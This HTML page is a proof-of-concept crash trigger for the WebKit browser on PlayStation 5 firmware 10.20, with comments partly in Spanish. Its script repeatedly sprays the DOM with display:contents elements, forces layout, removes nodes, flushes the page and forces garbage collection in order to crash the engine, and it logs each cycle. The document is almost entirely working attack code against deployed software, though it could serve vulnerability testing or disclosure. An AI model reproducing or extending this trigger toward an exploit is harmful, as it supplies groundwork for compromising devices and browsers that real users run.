<!DOCTYPE html>
<html>
<head>
  <title>WebKit Crash PoC - PS5 FW 10.20</title>
  <style>
    body {
      font-family: monospace;
      background: #000;
      color: #0f0;
    }
    #log {
      white-space: pre;
    }
  </style>
</head>
<body>
  <div id="log">[+] Running PoC...</div>

  <script>
    const log = (msg) => document.getElementById("log").textContent += `\n${msg}`;

    function sprayDOM(depth) {
      for (let i = 0; i < depth; i++) {
        let outer = document.createElement("div");
        outer.style.display = "contents";

        for (let j = 0; j < 10; j++) {
          let child = document.createElement("span");
          child.textContent = "CrashMe" + j;
          outer.appendChild(child);
        }

        document.body.appendChild(outer);

        // Forzar layout y luego eliminar en distintos momentos
        getComputedStyle(outer).color;
        if (i % 3 === 0) outer.remove(); // parcial
        if (i % 7 === 0) document.body.innerHTML = ""; // full flush
      }
    }

    function loopSpray() {
      log("[*] Starting aggressive spray...");
      let i = 0;
      const interval = setInterval(() => {
        sprayDOM(1000);

        try {
          if (window.gc) window.gc(); // Forzar GC si está disponible
        } catch (e) {}

        log(`[+] Cycle ${i++} done`);
        if (i > 20) {
          clearInterval(interval);
          log("[!] PoC completed. If no crash, patch may be in place.");
        }
      }, 250);
    }

    setTimeout(loopSpray, 1000);
  </script>
</body>
</html>
